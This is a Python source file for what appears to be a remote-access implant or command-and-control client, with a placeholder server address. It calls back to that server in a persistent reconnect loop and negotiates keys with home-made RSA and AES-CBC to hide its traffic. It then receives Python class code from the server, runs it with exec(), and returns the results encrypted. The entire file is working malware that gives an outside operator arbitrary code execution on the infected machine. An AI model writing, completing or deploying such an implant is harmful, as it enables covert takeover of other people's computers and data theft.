import socket
import time
import threading
import base64
import os
import random
import string
import xml.etree.ElementTree as ET

SERVER_IP = '[SERVER_IP]'
SERVER_PORT = int('[SERVER_PORT]')
INTERVAL_INFO = int('[INTERVAL_INFO]')
INTERVAL_RECONN = int('[INTERVAL_RECONN]')

g_bConnected = False

g_szTag = 'python3'

class C2P:
    HEADER_LENGTH = 6
    BUFFER_MAX_LENGTH = 65565

    def __init__(self, nCmd: int = None, nParam: int = None, abData: bytes = None, abBuffer: bytes = None) -> None:

        self.abMoreData = b''
        self.abData = b''
        self.abBuffer = b''
        self.nCmd = 0
        self.nParam = 0
        self.nLength = 0

        if abBuffer is not None:
            if len(abBuffer) < C2P.HEADER_LENGTH:
                return

            self.abBuffer = abBuffer

            self.nCmd = abBuffer[0]
            self.nParam = abBuffer[1]
            self.nLength = int.from_bytes(abBuffer[2:C2P.HEADER_LENGTH], byteorder='big')

            data_start = C2P.HEADER_LENGTH
            data_end = data_start + self.nLength

            if len(abBuffer) - C2P.HEADER_LENGTH >= self.nLength:
                self.abData = abBuffer[data_start:data_end]

            if len(abBuffer) > data_end:
                self.abMoreData = abBuffer[data_end:]

        else:
            if abData is None:
                abData = b''

            self.nCmd = nCmd
            self.nParam = nParam
            self.abData = abData
            self.nLength = len(abData)

            self.abBuffer = nCmd.to_bytes(1, 'big') + nParam.to_bytes(1, 'big') + self.nLength.to_bytes(4, 'big') + abData


    def get_header(self) -> tuple[int, int, int]:
        self.nCmd = self.abBuffer[0]
        self.nParam = self.abBuffer[1]
        self.nLength = int.from_bytes(self.abBuffer[2:C2P.HEADER_LENGTH], byteorder='big')

        return (self.nCmd, self.nParam, self.nLength)

    def get_msg(self) -> bytes:
        return self.abData
    
    def get_buffer(self) -> bytes:
        return self.abBuffer
    
    def more_data(self) -> bytes:
        return self.abMoreData

    def combine_bytes(self, abFirst: bytes, nIdxFirst: int, nLenFirst: int, abSecond: bytes, nIdxSecond: int, nLenSecond: int) -> bytes:
        return abFirst[nIdxFirst:nIdxFirst + nLenFirst] + abSecond[nIdxSecond:nIdxSecond + nLenSecond]
    
    @staticmethod
    def random_str(n_str_len = 10):
        return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(n_str_len))

class Encoder:
    @staticmethod
    def bytes2b64str(buffer: bytes) -> str:
        return base64.b64encode(buffer).decode('utf-8')

    @staticmethod
    def b64str2bytes(text: str) -> bytes:
        return base64.b64decode(text)
    
    @staticmethod
    def b64d2str(text: str) -> str:
        return base64.b64decode(text.encode('utf-8'))
    
    @staticmethod
    def stre2b64(text: str) -> str:
        return base64.b64encode(text.encode('utf-8')).decode('utf-8')

class PAES:
    s_box = (
        0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
        0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
        0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
        0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
        0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
        0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
        0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
        0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
        0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
        0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
        0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
        0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
        0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
        0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
        0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
        0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,
    )

    inv_s_box = (
        0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,
        0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,
        0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,
        0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,
        0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,
        0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,
        0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,
        0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,
        0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,
        0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,
        0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,
        0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,
        0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,
        0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,
        0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,
        0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,
    )

    r_con = (
        0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40,
        0x80, 0x1B, 0x36, 0x6C, 0xD8, 0xAB, 0x4D, 0x9A,
        0x2F, 0x5E, 0xBC, 0x63, 0xC6, 0x97, 0x35, 0x6A,
        0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39,
    )

    # learned from https://web.archive.org/web/20100626212235/http://cs.ucsb.edu/~koc/cs178/projects/JT/aes.c
    xtime = lambda a: (((a << 1) ^ 0x1B) & 0xFF) if (a & 0x80) else (a << 1)

    rounds_by_key_size = {
        16: 10,
        24: 12,
        32: 14,
    }

    def __init__(self, abIV: bytes = None, abKey: bytes = None):
        if abKey:
            self.abKey = abKey
        else:
            self.abKey = os.urandom(32) # 32 bytes

        if abIV:
            self.abIV = abIV
        else:
            self.abIV = os.urandom(16) # 16 bytes

        self.n_rounds = PAES.rounds_by_key_size[len(self.abKey)]
        self.key_matrices = self._expand_key(self.abKey)

    def sub_bytes(self, s):
        for i in range(4):
            for j in range(4):
                s[i][j] = PAES.s_box[s[i][j]]

    def inv_sub_bytes(self, s):
        for i in range(4):
            for j in range(4):
                s[i][j] = PAES.inv_s_box[s[i][j]]

    def shift_rows(self, s):
        s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1]
        s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]
        s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3]


    def inv_shift_rows(self, s):
        s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1]
        s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]
        s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3]

    def add_round_key(self, s, k):
        for i in range(4):
            for j in range(4):
                s[i][j] ^= k[i][j]

    def mix_single_column(self, a):
        xtime = PAES.xtime

        # see Sec 4.1.2 in The Design of Rijndael
        t = a[0] ^ a[1] ^ a[2] ^ a[3]
        u = a[0]
        a[0] ^= t ^ xtime(a[0] ^ a[1])
        a[1] ^= t ^ xtime(a[1] ^ a[2])
        a[2] ^= t ^ xtime(a[2] ^ a[3])
        a[3] ^= t ^ xtime(a[3] ^ u)

    def mix_columns(self, s):
        for i in range(4):
            self.mix_single_column(s[i])

    def inv_mix_columns(self, s):
        xtime = PAES.xtime

        # see Sec 4.1.3 in The Design of Rijndael
        for i in range(4):
            u = xtime(xtime(s[i][0] ^ s[i][2]))
            v = xtime(xtime(s[i][1] ^ s[i][3]))
            s[i][0] ^= u
            s[i][1] ^= v
            s[i][2] ^= u
            s[i][3] ^= v

        self.mix_columns(s)

    def bytes2matrix(self, text):
        """ Converts a 16-byte array into a 4x4 matrix.  """
        return [list(text[i:i+4]) for i in range(0, len(text), 4)]

    def matrix2bytes(self, matrix):
        """ Converts a 4x4 matrix into a 16-byte array.  """
        return bytes(sum(matrix, []))

    def xor_bytes(self, a, b):
        """ Returns a new byte array with the elements xor'ed. """
        return bytes(i^j for i, j in zip(a, b))

    def inc_bytes(self, a):
        """ Returns a new byte array with the value increment by 1 """
        out = list(a)
        for i in reversed(range(len(out))):
            if out[i] == 0xFF:
                out[i] = 0
            else:
                out[i] += 1
                break
        return bytes(out)
    
    def add_round_key(self, s, k):
        for i in range(4):
            for j in range(4):
                s[i][j] ^= k[i][j]

    def _expand_key(self, master_key):
        """
        Expands and returns a list of key matrices for the given master_key.
        """
        # Initialize round keys with raw key material.
        key_columns = self.bytes2matrix(master_key)
        iteration_size = len(master_key) // 4

        i = 1
        while len(key_columns) < (self.n_rounds + 1) * 4:
            # Copy previous word.
            word = list(key_columns[-1])

            # Perform schedule_core once every "row".
            if len(key_columns) % iteration_size == 0:
                # Circular shift.
                word.append(word.pop(0))
                # Map to S-BOX.
                word = [PAES.s_box[b] for b in word]
                # XOR with first byte of R-CON, since the others bytes of R-CON are 0.
                word[0] ^= PAES.r_con[i]
                i += 1
            elif len(master_key) == 32 and len(key_columns) % iteration_size == 4:
                # Run word through S-box in the fourth iteration when using a
                # 256-bit key.
                word = [PAES.s_box[b] for b in word]

            # XOR with equivalent word from previous iteration.
            word = self.xor_bytes(word, key_columns[-iteration_size])
            key_columns.append(word)

        # Group key words in 4x4 byte matrices.
        return [key_columns[4*i : 4*(i+1)] for i in range(len(key_columns) // 4)]

    def pad(self, plaintext):
        """
        Pads the given plaintext with PKCS#7 padding to a multiple of 16 bytes.
        Note that if the plaintext size is a multiple of 16,
        a whole block will be added.
        """
        padding_len = 16 - (len(plaintext) % 16)
        padding = bytes([padding_len] * padding_len)
        return plaintext + padding

    def unpad(self, plaintext):
        """
        Removes a PKCS#7 padding, returning the unpadded text and ensuring the
        padding was correct.
        """
        padding_len = plaintext[-1]
        assert padding_len > 0
        message, padding = plaintext[:-padding_len], plaintext[-padding_len:]
        assert all(p == padding_len for p in padding)
        return message
    
    def split_blocks(self, message, block_size=16, require_padding=True):
        assert len(message) % block_size == 0 or not require_padding
        return [message[i:i+16] for i in range(0, len(message), block_size)]

    def get_key(self) -> bytes:
        return self.abKey
    
    def get_iv(self) -> bytes:
        return self.abIV
    
    def encrypt_block(self, plaintext):
        assert len(plaintext) == 16
        plain_state = self.bytes2matrix(plaintext)
        self.add_round_key(plain_state, self.key_matrices[0])

        for i in range(1, self.n_rounds):
            self.sub_bytes(plain_state)
            self.shift_rows(plain_state)
            self.mix_columns(plain_state)
            self.add_round_key(plain_state, self.key_matrices[i])

        self.sub_bytes(plain_state)
        self.shift_rows(plain_state)
        self.add_round_key(plain_state, self.key_matrices[-1])

        return self.matrix2bytes(plain_state)
    
    def decrypt_block(self, cipher_text):
        assert len(cipher_text) == 16

        cipher_state = self.bytes2matrix(cipher_text)

        self.add_round_key(cipher_state, self.key_matrices[-1])
        self.inv_shift_rows(cipher_state)
        self.inv_sub_bytes(cipher_state)

        for i in range(self.n_rounds - 1, 0, -1):
            self.add_round_key(cipher_state, self.key_matrices[i])
            self.inv_mix_columns(cipher_state)
            self.inv_shift_rows(cipher_state)
            self.inv_sub_bytes(cipher_state)

        self.add_round_key(cipher_state, self.key_matrices[0])

        return self.matrix2bytes(cipher_state)
    
    def encrypt_cbc(self, plain_text):
        assert len(self.abIV) == 16

        plain_text = self.pad(plain_text)
        blocks = []
        previous = self.abIV

        for plaintext_block in self.split_blocks(plain_text):
            block = self.encrypt_block(self.xor_bytes(plaintext_block, previous))
            blocks.append(block)
            previous = block
        
        return b''.join(blocks)

    def decrypt_cbc(self, ciphertext):
        assert len(self.abIV) == 16

        blocks = []
        previous = self.abIV
        for ciphertext_block in self.split_blocks(ciphertext):
            # CBC mode decrypt: previous XOR decrypt(ciphertext)
            blocks.append(self.xor_bytes(previous, self.decrypt_block(ciphertext_block)))
            previous = ciphertext_block

        return self.unpad(b''.join(blocks))

class PRSA:
    def __init__(self):
        pass
    
    @staticmethod
    def xml_to_rsa_key(xml_key, private=False):
        root = ET.fromstring(xml_key)
        modulus_base64 = root.find('Modulus').text
        exponent_base64 = root.find('Exponent').text
        
        modulus = int.from_bytes(base64.b64decode(modulus_base64), byteorder='big')
        exponent = int.from_bytes(base64.b64decode(exponent_base64), byteorder='big')

        if private:
            p = int.from_bytes(base64.b64decode(root.find('P').text), byteorder='big')
            q = int.from_bytes(base64.b64decode(root.find('Q').text), byteorder='big')
            dp = int.from_bytes(base64.b64decode(root.find('DP').text), byteorder='big')
            dq = int.from_bytes(base64.b64decode(root.find('DQ').text), byteorder='big')
            iqmp = int.from_bytes(base64.b64decode(root.find('InverseQ').text), byteorder='big')
            d = int.from_bytes(base64.b64decode(root.find('D').text), byteorder='big')
            return {
                'modulus': modulus,
                'exponent': exponent,
                'p': p,
                'q': q,
                'dp': dp,
                'dq': dq,
                'iqmp': iqmp,
                'd': d
            }
        else:
            return {
                'modulus': modulus,
                'exponent': exponent
            }
        
    @staticmethod
    def extended_gcd(a, b):
        if a == 0:
            return (b, 0, 1)
        gcd, x1, y1 = PRSA.extended_gcd(b % a, a)
        x = y1 - (b // a) * x1
        y = x1
        return (gcd, x, y)

    @staticmethod
    def mod_inverse(a, m):
        gcd, x, _ = PRSA.extended_gcd(a, m)
        if gcd != 1:
            raise ValueError('Modular inverse does not exist')
        return x % m

    @staticmethod
    def rsa_encrypt(message, public_key):
        modulus = public_key['modulus']
        exponent = public_key['exponent']
        
        message = b'\x00\x02' + b'\xFF' * (modulus.bit_length() // 8 - len(message) - 3) + b'\x00' + message
        message_int = int.from_bytes(message, byteorder='big')
        cipher_int = pow(message_int, exponent, modulus)
        return cipher_int.to_bytes((cipher_int.bit_length() + 7) // 8, byteorder='big')

    @staticmethod
    def rsa_decrypt(ciphertext, private_key):
        modulus = private_key['modulus']
        d = private_key['d']
        cipher_int = int.from_bytes(ciphertext, byteorder='big')
        message_int = pow(cipher_int, d, modulus)
        message = message_int.to_bytes((message_int.bit_length() + 7) // 8, byteorder='big')
        
        if message[:2] != b'\x00\x02':
            raise ValueError('Invalid padding')
        padding_length = message.find(b'\x00', 2)
        if padding_length == -1:
            raise ValueError('Invalid padding')
        
        return message[padding_length + 1:]

class Client:
    def __init__(self, sock: socket.socket) -> None:
        self.sock = sock
        self.addr = None

        self.pAES = PAES()
        self.xml_rsa_pubKey = None
        self.xml_rsa_privKey = None

        self.szChallenge = None

        self.dic_class = dict()
        self.dic_class['INTERVAL_INFO'] = INTERVAL_INFO

    def send(self, nCmd: int, nParam: int, szMsg: str):
        buffer = C2P(nCmd=nCmd, nParam=nParam, abData=szMsg.encode('ascii')).get_buffer()
        self.sock.send(buffer)

    def sendcommand(self, nCmd: int, nParam: int):
        self.send(nCmd=nCmd, nParam=nParam, szMsg=C2P.random_str())

    def sendcipher(self, nCmd: int, nParam: int, szMsg: str):
        pAES = self.get_aes()
        abMsg = szMsg.encode()
        abEncMsg = pAES.encrypt_cbc(abMsg)
        szEncMsg = base64.b64encode(abEncMsg).decode('ascii')

        self.send(nCmd=nCmd, nParam=nParam, szMsg=szEncMsg)

    def sendserver(self, aMsg: list):
        
        self.sendcipher(2, 3, '|'.join([Encoder.stre2b64(x) for x in aMsg]))

    def set_aes(self, pAES: PAES):
        self.pAES = pAES

    def get_aes(self) -> PAES:
        return self.pAES

    def close(self):
        self.sock.close()

def combine_bytes(abFirst: bytes, nIdxFirst: int, nLenFirst: int, abSecond: bytes, nIdxSecond: int, nLenSecond: int) -> bytes:
    return abFirst[nIdxFirst:nIdxFirst + nLenFirst] + abSecond[nIdxSecond:nIdxSecond + nLenSecond]

def handler(clnt_sock: socket.socket):
    global g_bConnected

    abStaticRecv = b''
    abDynamicRecv = b''

    clnt = Client(clnt_sock)
    clnt.set_aes(PAES())

    clnt.sendcommand(0, 1)

    while True:
        try:
            abStaticRecv = clnt_sock.recv(C2P.BUFFER_MAX_LENGTH)
            nRecvLength = len(abStaticRecv)

            abDynamicRecv = combine_bytes(abDynamicRecv, 0, len(abDynamicRecv), abStaticRecv, 0, nRecvLength)
            
            if not nRecvLength:
                break
            elif len(abDynamicRecv) < C2P.HEADER_LENGTH:
                continue
            else:
                c2p = C2P(abBuffer=abDynamicRecv)
                tpHeader = c2p.get_header()
                nLength = tpHeader[2]

                while len(abDynamicRecv) - C2P.HEADER_LENGTH >= nLength:
                    try:
                        c2p = C2P(abBuffer=abDynamicRecv)
                        abDynamicRecv = c2p.more_data()
                        tpHeader = c2p.get_header()

                        nCmd = tpHeader[0]
                        nParam = tpHeader[1]
                        nLength = tpHeader[2]
                        abMsg = c2p.get_msg()

                        pAES = clnt.pAES

                        if nCmd == 0:
                            if nParam == 0:
                                exit()
                            elif nParam == 1:
                                def send_lattency():
                                    time.sleep(1)
                                    clnt.send(0, 1, C2P.random_str())

                                t = threading.Thread(target=send_lattency)
                                t.daemon = True

                                t.start()
                        elif nCmd == 1:
                            if nParam == 1:
                                szMsg = abMsg.decode('utf-8')
                                xml_PubKey = Encoder.b64d2str(szMsg)
                                pub_key = PRSA.xml_to_rsa_key(xml_PubKey)
                                
                                ab_enc_iv = PRSA.rsa_encrypt(clnt.pAES.get_iv(), pub_key)
                                ab_enc_key = PRSA.rsa_encrypt(clnt.pAES.get_key(), pub_key)

                                sz_enc_iv = Encoder.bytes2b64str(ab_enc_iv)
                                sz_enc_key = Encoder.bytes2b64str(ab_enc_key)

                                szMsg = f'{sz_enc_iv}|{sz_enc_key}'

                                clnt.send(1, 2, f'{Encoder.stre2b64(szMsg)}')
                            elif nParam == 3:
                                szChallenge = abMsg.decode('utf-8')

                                ab_enc_resp = clnt.pAES.encrypt_cbc(szChallenge.encode('utf-8'))
                                sz_b64_resp = Encoder.bytes2b64str(ab_enc_resp)

                                clnt.send(1, 4, sz_b64_resp)
                        elif nCmd == 2:
                            abMsg = base64.b64decode(abMsg)
                            szDecMsg = clnt.pAES.decrypt_cbc(abMsg).decode('utf-8')
                            
                            if nParam == 0:
                                clnt.sendcipher(2, 1, g_szTag)
                            elif nParam == 2: # Send machine information.
                                aMsg = [base64.b64decode(x).decode('utf-8') for x in szDecMsg.split('|')]

                                szToken = aMsg[0]
                                szClassName = aMsg[1]
                                szClassStr = aMsg[2]
                                aParam = aMsg[3:]

                                if szClassName not in clnt.dic_class.keys():
                                    exec(szClassStr, clnt.dic_class)

                                    clnt.dic_class[szClassName] = clnt.dic_class[szClassName]()

                                def foo():
                                    try:
                                        objClass = clnt.dic_class[szClassName]
                                        if not hasattr(objClass, 'run'):
                                            return
                                        
                                        ret_val = objClass.run(clnt, szToken, aParam)

                                        if ret_val == None:
                                            return

                                        assert isinstance(ret_val, list)

                                        ret_val.insert(0, szToken)

                                        clnt.sendserver(ret_val)

                                    except OSError as ex:
                                        if ex.errno == 9:
                                            clnt_sock.close()
                                            global g_bConnected
                                            g_bConnected = False
                                
                                threading.Thread(target=foo, args=[]).start()

                    except Exception as ex:
                        continue

        except Exception as ex:
            continue

    clnt_sock.close()
    clnt = None

    g_bConnected = False

def connect(sock: socket.socket):
    global g_bConnected

    while True:
        if not g_bConnected:
            try:
                sock.connect((SERVER_IP, SERVER_PORT))
                g_bConnected = True
                
                buffer = C2P(1, 0, C2P.random_str().encode('utf-8')).get_buffer()

                sock.send(buffer)

                handler(sock)
            except Exception as ex:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        time.sleep(1)

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    threading.Thread(target=connect, args=[sock, ]).start()

if __name__ == '__main__':
    main()